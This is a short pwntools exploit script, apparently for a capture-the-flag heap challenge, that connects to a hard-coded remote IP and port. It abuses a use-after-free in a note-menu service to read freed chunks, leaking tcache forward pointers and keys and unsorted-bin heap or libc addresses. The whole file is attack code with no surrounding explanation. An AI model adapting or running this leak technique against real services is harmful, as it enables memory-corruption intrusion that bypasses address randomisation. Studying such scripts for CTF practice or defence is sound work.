from pwn import *
import struct
context.log_level='error'
HOST='52.76.96.108'; PORT=9005

def create(p, idx, size, data):
    p.sendline(b'1'); p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); p.recvuntil(b'size: ')
    p.sendline(str(size).encode()); p.recvuntil(b'data: ')
    p.send(data); return p.recvuntil(b'> ', timeout=2)

def delete(p, idx):
    p.sendline(b'3'); p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); return p.recvuntil(b'> ', timeout=2)

def readn(p, idx):
    p.sendline(b'4'); p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); return p.recvuntil(b'> ', timeout=2)

def getdata(r):
    idx=r.find(b'data: ')
    return r[idx+6:r.find(b'\n',idx)]

p=remote(HOST,PORT); p.recvuntil(b'> ')
# single small chunk free -> examine fd
create(p,0,0x30,b'A'*0x2f+b'\n')
delete(p,0)
r=readn(p,0)
d=getdata(r)
print("single freed 0x30 chunk data:", d.hex())
print("fd=",hex(struct.unpack('<Q',d[:8])[0]))
print("key=",hex(struct.unpack('<Q',d[8:16])[0]))
p.close()

# unsorted leak single run fresh
p=remote(HOST,PORT); p.recvuntil(b'> ')
create(p,0,0x500,b'A'*0x4ff+b'\n')
create(p,1,0x500,b'B'*0x4ff+b'\n')
create(p,2,0x20,b'C'*0x1f+b'\n')
delete(p,0)
r=readn(p,0)
d=getdata(r)
print("unsorted leak:", d.hex())
print("ptr0=",hex(struct.unpack('<Q',d[:8])[0]))
print("ptr1=",hex(struct.unpack('<Q',d[8:16])[0]))
p.close()
